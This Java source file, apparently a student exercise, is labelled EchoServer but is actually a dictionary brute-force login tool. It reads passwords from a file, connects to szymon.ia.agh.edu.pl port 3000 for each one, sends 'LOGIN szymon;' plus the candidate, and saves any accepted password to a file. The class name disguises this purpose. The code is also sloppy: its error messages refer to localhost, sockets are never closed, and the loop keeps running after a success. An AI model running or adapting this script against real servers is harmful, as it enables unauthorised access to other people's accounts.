import java.io.*;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Scanner;

/**
 * Created by Marcel on 13.12.2016.
 */
public class EchoServer {

    private Socket socket = null;
    private PrintWriter printWriter = null;
    private BufferedReader bufferedReader = null;

    public EchoServer(){
        findPassword();
    }

    public void connect(){
        try {
            socket = new Socket("szymon.ia.agh.edu.pl", 3000);
            printWriter = new PrintWriter(socket.getOutputStream(), true);
            bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        } catch (UnknownHostException e) {
            System.err.println("Don't know about host: localhost.");
            System.exit(1);
        } catch (IOException e) {
            System.err.println("Couldn't get I/O for "
                    + "the connection to: localhost.");
            System.exit(1);
        }
    }

    private void findPassword(){
        File file = new File("passwords.txt");
        Scanner in;
        String check = "false";
        String password;
        String message;

        try {
            in = new Scanner(file);
            while (in.hasNextLine()){
                password = in.nextLine();
                message = "LOGIN szymon;" + password;
                connect();
                printWriter.println(message);
                printWriter.flush();
                try {
                    check = bufferedReader.readLine();
                } catch (IOException e) {
                    System.err.println("You can't get to this server");
                }
                if (!check.equals("false")){
                    try{
                        PrintWriter writer = new PrintWriter("forrectPassword.txt", "UTF-8");
                        writer.println(password);
                        writer.close();
                    } catch (IOException e) {
                        System.err.println("Cannot create file to save a password");
                    }
                }
            }
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }
}
